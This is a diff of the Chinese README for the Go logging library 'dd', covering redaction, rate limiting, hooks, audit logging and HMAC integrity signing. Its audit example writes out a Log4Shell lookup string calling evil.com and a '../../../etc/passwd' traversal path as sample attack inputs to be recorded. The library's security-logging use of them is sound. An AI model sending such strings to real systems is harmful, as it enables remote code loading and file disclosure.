@@ -16,11 +16,12 @@
 
 | 特性 | 说明 |
 |------|------|
-| **高性能** | 极低分配（简单日志 1 次/操作），缓冲池复用，无锁读取 |
+| **高性能** | 简单日志零分配，缓冲池复用，无锁读取 |
 | **线程安全** | 原子操作 + 无锁设计，完全并发安全 |
-| **内置安全** | 敏感数据过滤、注入攻击防护 |
+| **内置安全** | 敏感数据过滤、注入攻击防护、日志速率限制 |
 | **结构化日志** | 类型安全字段、JSON/文本格式，可自定义字段名 |
 | **智能轮转** | 按大小自动轮转、自动压缩、自动清理 |
+| **审计日志** | 安全事件审计，支持 HMAC 完整性签名 |
 | **零依赖** | 仅使用 Go 标准库 |
 | **简单易用** | 30 秒快速上手，直观的 API |
 | **云原生** | JSON 格式兼容 ELK/Splunk/CloudWatch |
@@ -48,7 +49,7 @@ import "github.com/cybergodev/dd"
 
 func main() {
     // 零配置 - 直接使用包级函数
-    dd.Debug("调试信息")
+    dd.Debug("调试信息")  // 默认不可见（默认级别为 Info）
     dd.Info("应用启动")
     dd.Warn("缓存未命中")
     dd.Error("连接失败")
@@ -110,6 +111,8 @@ logger, err := dd.New(dd.DevelopmentConfig())
 logger, err := dd.New(dd.JSONConfig())
 ```
 
+> 所有预设均默认启用基础敏感数据过滤（见[安全特性](#安全特性)）。
+
 ### 自定义配置
 
 ```go
@@ -131,6 +134,16 @@ if err != nil {
     log.Fatalf("创建日志器失败: %v", err)
 }
 defer logger.Close()
+```
+
+使用 `cfg.Clone()` 从基础配置派生独立副本：
+
+```go
+base := dd.DefaultConfig()
+base.Format = dd.FormatJSON
+
+appCfg := base.Clone() // 深拷贝 - 可安全独立修改
+appCfg.Targets = []dd.OutputTarget{dd.FileOutput("app.log")}
 ```
 
 ### 输出目标
@@ -172,11 +185,15 @@ func main() {
 
     // 重新启用调用者信息
     cfg.DynamicCaller = true
-    dd.InitDefault(cfg)
+    if err := dd.InitDefault(cfg); err != nil {
+        panic(err)
+    }
 
     dd.Info("带调用者信息")    // 显示 文件:行号
 }
 ```
+
+也可以构建一个 logger 后用 `dd.SetDefault(logger)` 提升为全局默认。
 
 ### JSON 自定义
 
@@ -197,27 +214,32 @@ if err != nil {
 }
 ```
 
+> **注意:** `DefaultConfig()` 和 `DevelopmentConfig()` 中 `cfg.JSON` 为 `nil`，
+> 自定义前需先初始化：`cfg.JSON = dd.DefaultJSONOptions()`。
+
 ---
 
 ## 安全特性
 
 ### 敏感数据过滤
 
-```go
-cfg := dd.DefaultConfig()
-cfg.Security = dd.DefaultSecurityConfig()  // 启用基础过滤
+敏感数据过滤在所有预设（`DefaultConfig()`、`DevelopmentConfig()`、`JSONConfig()`）
+中**默认启用**，使用基础模式：
 
-logger, err := dd.New(cfg)
+```go
+logger, err := dd.New(dd.DefaultConfig()) // 基础过滤已生效
 if err != nil {
     log.Fatalf("创建日志器失败: %v", err)
 }
 
-// 自动过滤（基础 — DefaultSecurityConfig）
+// 自动过滤（基础模式）
 logger.Info("password=secret123")           // -> password=[REDACTED]
 logger.Info("api_key=sk-abc123")            // -> api_key=[REDACTED]
 logger.Info("credit_card=4532015112830366") // -> credit_card=[REDACTED]
 // 邮箱地址需要完整过滤：cfg.Security = dd.DefaultSecureConfig()
 ```
+
+要调整覆盖范围，可将 `cfg.Security` 替换为以下预设之一：
 
 | 安全级别 | 过滤类型 | 覆盖范围 |
 |---------|---------|---------|
@@ -232,7 +254,7 @@ logger.Info("credit_card=4532015112830366") // -> credit_card=[REDACTED]
 ```go
 cfg.Security = dd.SecurityConfigForLevel(dd.SecurityLevelDevelopment) // 不过滤
 cfg.Security = dd.SecurityConfigForLevel(dd.SecurityLevelBasic)       // 基础
-cfg.Security = dd.SecurityConfigForLevel(dd.SecurityLevelStandard)    // 标准
+cfg.Security = dd.SecurityConfigForLevel(dd.SecurityLevelStandard)    // 标准（完整过滤器）
 cfg.Security = dd.SecurityConfigForLevel(dd.SecurityLevelStrict)      // 严格
 cfg.Security = dd.SecurityConfigForLevel(dd.SecurityLevelParanoid)    // 最高
 ```
@@ -240,11 +262,23 @@ cfg.Security = dd.SecurityConfigForLevel(dd.SecurityLevelParanoid)    // 最高
 ### 自定义过滤规则
 
 ```go
+// 从空过滤器开始...
 filter := dd.NewEmptySensitiveDataFilter()
 filter.AddPatterns(
     `(?i)internal_token[:\s=]+[^\s]+`,
     `(?i)session_id[:\s=]+[^\s]+`,
 )
+
+// ...或在内置过滤器上扩展
+// filter := dd.NewSensitiveDataFilter()
+// filter.AddPatterns(`(?i)internal_token[:\s=]+[^\s]+`)
+
+// NewCustomSensitiveDataFilter 会预先校验模式并返回错误
+filter, err := dd.NewCustomSensitiveDataFilter(
+    `(?i)internal_token[:\s=]+[^\s]+`,
+    `(?i)session_id[:\s=]+[^\s]+`,
+)
+if err != nil { /* 无效模式 */ }
 
 cfg := dd.DefaultConfig()
 cfg.Security = &dd.SecurityConfig{
@@ -256,12 +290,48 @@ if err != nil {
 }
 ```
 
+过滤器还支持运行时管理：
+
+```go
+filter.AddPattern(`(?i)ssn[:\s=]+[^\s]+`) // 添加单个模式（带校验）
+filter.PatternCount()                      // 已注册模式数量
+filter.ClearPatterns()                     // 清除所有模式
+filter.Disable() / filter.Enable()         // 开关切换（不丢失模式）
+filter.IsEnabled()
+filter.GetFilterStats()                    // dd.FilterStats: 扫描、命中、丢弃统计
+```
+
 ### 禁用安全过滤（最高性能）
 
 ```go
 cfg := dd.DefaultConfig()
 cfg.Security = dd.SecurityConfigForLevel(dd.SecurityLevelDevelopment)
+// 过滤器为 nil = 无模式扫描。消息大小 / writer 数量上限仍然生效。
 ```
+
+### 日志速率限制
+
+防止故障级联下的日志洪泛（组件异常循环打日志）。速率限制默认关闭，
+通过 `SecurityConfig` 启用：
+
+```go
+cfg := dd.DefaultConfig()
+cfg.Security.RateLimitConfig = dd.DefaultRateLimitConfig()
+cfg.Security.RateLimitConfig.MaxMessagesPerSecond = 1000 // 默认: 10,000
+cfg.Security.RateLimitConfig.MaxBytesPerSecond = 5 << 20 // 默认: 10MB
+cfg.Security.RateLimitConfig.Strategy = dd.RateLimitStrategySample // 或 Drop（默认）
+
+logger, err := dd.New(cfg)
+```
+
+| 策略 | 超限时的行为 |
+|------|-------------|
+| `RateLimitStrategyDrop` | 丢弃超限消息（默认） |
+| `RateLimitStrategySample` | 每 `SamplingRate` 条保留 1 条 |
+| `RateLimitStrategyThrottle` | 当前行为与 Drop 相同 |
+
+> Fatal 级别消息始终绕过速率限制，保证 Fatal 日志不会被静默丢弃。
+> 配置了 `Config.Audit` 时，超限事件会触发 `RATE_LIMIT_EXCEEDED` 审计事件。
 
 ---
 
@@ -325,9 +395,9 @@ if err != nil { /* 处理错误 */ }
 
 multiWriter := dd.NewMultiWriter(os.Stdout, fileWriter)
 
-cfg := dd.DefaultConfig()
+cfg = dd.DefaultConfig()
 cfg.Targets = []dd.OutputTarget{dd.CustomOutput(multiWriter)}
-logger, err := dd.New(cfg)
+logger, err = dd.New(cfg)
 ```
 
 ### 缓冲写入（高吞吐场景）
@@ -398,15 +468,19 @@ logger.InfoWith("用户操作", append(traceFields,
 ```
 
 > **注意:** 始终使用有效的父 context（如 `context.Background()`），不能使用 `nil`。
+> 日志方法不接受 context 参数，因此 context 值**不会**被自动提取——
+> 请按上面的示例在调用处显式作为字段传入。
 
 ### 自定义 Context 提取器
 
+`ContextExtractors` 对每条日志执行。它们收到的是 `context.Background()`
+（没有可传递的请求 context），因此只用于进程级全局信息——
+主机名、服务名、环境：
+
 ```go
 tenantExtractor := func(ctx context.Context) []dd.Field {
-    if tenantID := ctx.Value("tenant_id"); tenantID != nil {
-        return []dd.Field{dd.String("tenant_id", tenantID.(string))}
-    }
-    return nil
+    hostname, _ := os.Hostname()
+    return []dd.Field{dd.String("hostname", hostname)}
 }
 
 cfg := dd.DefaultConfig()
@@ -417,6 +491,17 @@ logger, err := dd.New(cfg)
 ---
 
 ## 钩子（Hooks）
+
+钩子在明确的生命周期节点执行。通过 `HooksConfig` 注册：
+
+| 钩子事件 | 触发时机 |
+|---------|---------|
+| `HookBeforeLog` | 日志条目写入前（返回 error 可**中止**该条目） |
+| `HookAfterLog` | 日志条目成功写入后 |
+| `HookOnFilter` | 敏感数据被脱敏时（只携带字段键，绝不携带值） |
+| `HookOnRotate` | 日志文件轮转时 |
+| `HookOnClose` | logger 关闭时 |
+| `HookOnError` | 写入出错时 |
 
 ```go
 hooks := dd.NewHooksFromConfig(dd.HooksConfig{
@@ -443,7 +528,16 @@ hooks := dd.NewHooksFromConfig(dd.HooksConfig{
 cfg := dd.DefaultConfig()
 cfg.Hooks = hooks
 logger, err := dd.New(cfg)
+
+// 运行时注册更多钩子
+logger.AddHook(dd.HookOnRotate, func(ctx context.Context, hctx *dd.HookContext) error {
+    fmt.Println("日志已轮转")
+    return nil
+})
 ```
+
+> 默认情况下，钩子执行在首个钩子返回错误时停止。设置
+> `HooksConfig.ErrorHandler` 可执行全部钩子并将错误交给自定义处理器。
 
 ---
 
@@ -451,12 +545,23 @@ logger, err := dd.New(cfg)
 
 ### 审计事件
 
-```go
-// 创建审计日志器（默认输出到 os.Stderr）
-auditCfg := dd.DefaultAuditConfig()
-auditCfg.JSONFormat = true
+将审计配置挂到 logger 上，脱敏、速率限制、安全违规事件都会被记录为审计事件：
 
-auditLogger, err := dd.NewAuditLogger(auditCfg)
+```go
+cfg := dd.DefaultConfig()
+
+auditCfg := dd.DefaultAuditConfig() // JSON 输出到 os.Stderr，异步缓冲 1000
+cfg.Audit = &auditCfg               // 将审计事件接入 logger
+
+logger, err := dd.New(cfg)
+if err != nil { /* 处理错误 */ }
+defer logger.Close()
+```
+
+或创建独立的审计日志器，直接上报安全事件：
+
+```go
+auditLogger, err := dd.NewAuditLogger(dd.DefaultAuditConfig())
 if err != nil { /* 处理错误 */ }
 defer auditLogger.Close()
 
@@ -466,7 +571,12 @@ auditLogger.LogPathTraversalAttempt("../../../etc/passwd", "路径遍历已阻�
 auditLogger.LogSecurityViolation("LOG4SHELL", "检测到可疑模式", map[string]any{
     "input": "${jndi:ldap://evil.com/a}",
 })
+
+// 还有: LogRateLimitExceeded, LogReDoSAttempt, LogIntegrityViolation
+stats := auditLogger.Stats() // 按类型统计事件数
 ```
+
+使用 `dd.VerifyAuditEvent(entry, signer)` 校验已写入的审计行。
 
 ### 日志完整性
 
@@ -480,8 +590,11 @@ if err != nil { /* 处理错误 */ }
 
 // 签名日志消息
 message := "关键审计事件"
-signature := signer.Sign(message)
+signature := signer.Sign(message) // 格式: [SIG:timestamp:sequence:hmac]
 fmt.Printf("已签名: %s %s\n", message, signature)
+
+// 对消息及其结构化字段一起签名
+sigWithFields := signer.SignFields("用户登录", []dd.Field{dd.String("user_id", "42")})
 
 // 验证签名
 result, err := signer.Verify(message + " " + signature)
@@ -489,6 +602,10 @@ if err == nil && result.Valid {
     fmt.Println("签名有效")
 }
 ```
+
+> 通过 `AuditConfig.IntegritySigner = signer` 将签名器接入审计输出。
+> 签名器维护单调递增的序列号——可用 `GetSequence()`、`ResetSequence()`、
+> `Stats()` 进行监控。
 
 ---
 
@@ -524,6 +641,11 @@ recorder.ContainsMessage("用户登录")           // true
 recorder.ContainsField("user_id")             // true
 recorder.GetFieldValue("user_id")             // "123"
 recorder.EntriesAtLevel(dd.LevelInfo)         // []LogEntry{...}
+
+// 其他方法
+recorder.Entries()   // 全部捕获的条目
+recorder.Clear()     // 测试用例间重置
+recorder.SetFormat(dd.FormatJSON) // 以 JSON 模式解析输出
 ```
 
 ---
@@ -553,14 +675,21 @@ logger, err := dd.New(cfg)
 // 严格的 snake_case 验证
 logger.SetFieldValidation(dd.StrictSnakeCaseConfig())
 
+// 还有: StrictCamelCaseConfig(), DefaultFieldValidationConfig()
+// 命名规范: NamingConventionSnakeCase, CamelCase, PascalCase, KebabCase
+
 // 自定义验证
 fv := &dd.FieldValidationConfig{
-    Mode:                     dd.FieldValidationStrict,
+    Mode:                     dd.FieldValidationWarn,
     Convention:               dd.NamingConventionSnakeCase,
-    AllowCommonAbbreviations: true,
+    AllowCommonAbbreviations: true, // 接受 ID、URL、HTTP 等
+    EnableSecurityValidation: true, // Log4Shell / 同形字符检测
 }
 logger.SetFieldValidation(fv)
 ```
+
+> 日志方法不返回错误，因此 `Warn` 和 `Strict` 模式都只是向 stderr 输出诊断
+> 信息，字段仍会被记录——`Strict` 仅改变诊断措辞。验证默认关闭。
 
 ### 动态级别解析
 
@@ -574,6 +703,31 @@ logger.SetLevelResolver(func(ctx context.Context) dd.LogLevel {
         return dd.LevelWarn  // 高错误率下降低日志量
     }
     return dd.LevelDebug
+})
+```
+
+### 自定义 Fatal 处理器
+
+`Fatal`/`Fatalf` 通过 `os.Exit(1)` 终止进程——defer 函数不会执行。
+使用 `FatalHandler` 在退出前刷新和清理：
+
+```go
+cfg := dd.DefaultConfig()
+var logger *dd.Logger
+cfg.FatalHandler = func() {
+    logger.Close()   // 刷新缓冲 writer
+    os.Exit(1)
+}
+logger, err = dd.New(cfg)
+```
+
+### 写入错误处理
+
+默认情况下 writer 错误被静默忽略。设置处理器可将其路由到指标或备用输出：
+
+```go
+logger.SetWriteErrorHandler(func(w io.Writer, err error) {
+    fmt.Fprintf(os.Stderr, "日志写入失败: %v\n", err)
 })
 ```
 
@@ -594,7 +748,8 @@ defer func() {
 
 ### 调试工具
 
-快速数据检查（输出到 stdout，不经过安全过滤）：
+快速数据检查。`Text`/`JSON` 直接写入 stdout，**不经过**安全过滤——
+切勿用于输出敏感数据：
 
 ```go
 dd.Text(myStruct)                      // 格式化输出
@@ -602,7 +757,15 @@ dd.Textf("值: %v", data)               // 格式化文本
 dd.JSON(myStruct)                      // 带调用者信息的 JSON
 dd.JSONF("结果: %v", data)             // 格式化 JSON
 
-// 也可通过 logger 实例调用
+// Print 系列: 经过默认 logger（LevelInfo，安全过滤）
+dd.Print(myStruct)
+dd.Printf("count=%d", n)
+
+// Exit 辅助: 打印后 os.Exit(0) — 仅用于调试
+dd.Exit(myStruct)
+dd.Exitf("unreachable: %v", state)
+
+// Text/JSON 也可通过 logger 实例调用
 logger.Text(myStruct)
 logger.JSON(myStruct)
 ```
@@ -613,15 +776,15 @@ logger.JSON(myStruct)
 
 | 操作 | 吞吐量 | 内存/操作 | 分配次数 |
 |------|--------|-----------|----------|
-| 简单日志 | ~49 万/秒 | 64 B | 1 |
-| 结构化日志（3 字段） | ~27 万/秒 | 241 B | 4 |
-| JSON 格式 | ~29.5 万/秒 | 225 B | 3 |
-| 级别检查 | ~3.6 亿/秒 | 0 B | 0 |
-| 并发（22 goroutines） | ~430 万/秒 | 80 B | 1 |
+| 简单日志 | ~300 万/秒 | 0 B | 0 |
+| 结构化日志（3 字段） | ~150 万/秒 | 104 B | 2 |
+| JSON 格式 | ~140 万/秒 | 64 B | 1 |
+| 级别检查 | ~3.1 亿/秒 | 0 B | 0 |
+| 并发（GOMAXPROCS=22） | ~700 万/秒 | 0 B | 0 |
 
-> 基准使用默认配置（启用安全过滤）写入 `io.Discard`；在 Intel Core Ultra 9 上测得。  
-> `内存/操作` 与 `分配次数` 为确定性数值；吞吐量随硬件变化。可用  
-> `go test -bench=. -benchmem` 复现。
+> 基准使用默认配置（启用安全过滤）写入 `io.Discard`；在 Intel Core Ultra 9
+> （22 核）上测得。`内存/操作` 与 `分配次数` 为确定性数值；吞吐量随硬件变化。
+> 可用 `go test -bench=. -benchmem` 复现。
 
 **优化建议:**
 - 在执行昂贵操作前使用 `IsLevelEnabled()` 检查：`if logger.IsDebugEnabled() { ... }`
@@ -700,6 +863,11 @@ dd.Flush() error
 dd.AddWriter(w io.Writer) error
 dd.RemoveWriter(w io.Writer) error
 dd.WriterCount() int
+
+// 调试工具（直接写 stdout，不过滤——见上面的调试工具说明）
+dd.Text(data ...any) / dd.Textf(format string, args ...any)
+dd.JSON(data ...any) / dd.JSONF(format string, args ...any)
+dd.Exit(data ...any) / dd.Exitf(format string, args ...any)  // 打印后 os.Exit(0)
 ```
 
 ### Logger 方法
@@ -751,6 +919,9 @@ logger.GetSecurityConfig() *SecurityConfig
 logger.ActiveFilterGoroutines() int32
 logger.WaitForFilterGoroutines(timeout time.Duration) bool
 
+// 错误处理
+logger.SetWriteErrorHandler(handler WriteErrorHandler)
+
 // Context 提取器
 logger.AddContextExtractor(extractor ContextExtractor) error
 logger.SetContextExtractors(extractors ...ContextExtractor) error
@@ -793,6 +964,72 @@ dd.Err(err error)                    // 错误字段（键: "error"）
 dd.ErrWithKey(key string, err error) // 自定义键的错误字段
 dd.ErrWithStack(err error)           // 带堆栈信息的错误
 dd.Any(key string, value any)        // 任意类型
+```
+
+### 安全 API
+
+```go
+// 预设配置
+dd.DefaultSecurityConfig() // 基础（所有预设的默认值）
+dd.DefaultSecureConfig()   // 完整
+dd.HealthcareConfig()      // HIPAA
+dd.FinancialConfig()       // PCI-DSS
+dd.GovernmentConfig()      // 政府
+
+// 按级别选择
+dd.SecurityConfigForLevel(level SecurityLevel) *SecurityConfig
+// 级别: SecurityLevelDevelopment, Basic, Standard, Strict, Paranoid
+
+// 敏感数据过滤器
+filter := dd.NewSensitiveDataFilter()          // 基础模式
+filter := dd.NewEmptySensitiveDataFilter()     // 无模式
+filter, err := dd.NewCustomSensitiveDataFilter(patterns ...string)
+
+// 过滤器方法
+filter.AddPattern(pattern string) error
+filter.AddPatterns(patterns ...string) error
+filter.ClearPatterns()
+filter.PatternCount() int
+filter.Enable() / filter.Disable()
+filter.IsEnabled() bool
+filter.GetFilterStats() FilterStats
+filter.WaitForGoroutines(timeout time.Duration) bool
+filter.Close() bool
+
+// 速率限制
+dd.DefaultRateLimitConfig() *RateLimitConfig
+// 字段: MaxMessagesPerSecond, MaxBytesPerSecond, BurstSize,
+//       Strategy, SamplingRate
+// 策略: RateLimitStrategyDrop（默认）, Sample, Throttle
+```
+
+### 审计与完整性 API
+
+```go
+// 审计
+dd.DefaultAuditConfig() AuditConfig
+dd.NewAuditLogger(cfg AuditConfig) (*AuditLogger, error)
+dd.VerifyAuditEvent(entry string, signer *IntegritySigner) *AuditVerificationResult
+
+auditLogger.Log(event AuditEvent)
+auditLogger.LogSensitiveDataRedaction(pattern, field, message string)
+auditLogger.LogRateLimitExceeded(message string, metadata map[string]any)
+auditLogger.LogSecurityViolation(violationType, message string, metadata map[string]any)
+auditLogger.LogReDoSAttempt(pattern, message string)
+auditLogger.LogIntegrityViolation(message string, metadata map[string]any)
+auditLogger.LogPathTraversalAttempt(path, message string)
+auditLogger.Stats() AuditStats
+auditLogger.Close() error
+
+// 完整性
+integrityCfg, err := dd.DefaultIntegrityConfigSafe() // 自动生成密钥
+signer, err := dd.NewIntegritySigner(integrityCfg)
+signer.Sign(message string) string
+signer.SignFields(message string, fields []Field) string
+signer.Verify(entry string) (*LogIntegrity, error)
+signer.GetSequence() uint64
+signer.ResetSequence()
+signer.Stats() IntegrityStats
 ```
 
 ### 输出目标辅助函数
@@ -891,7 +1128,7 @@ type Service struct {
 | [06_context_hooks.go](examples/06_context_hooks.go) | 追踪、钩子 |
 | [07_convenience.go](examples/07_convenience.go) | 输出目标、快速配置 |
 | [08_production.go](examples/08_production.go) | 生产环境模式 |
-| [09_advanced.go](examples/09_advanced.go) | 采样、验证 |
+| [09_advanced.go](examples/09_advanced.go) | 采样、验证、Fatal 处理器 |
 | [10_audit_integrity.go](examples/10_audit_integrity.go) | 审计、完整性 |
 | [11_testing.go](examples/11_testing.go) | 使用 LoggerRecorder 测试 |
 
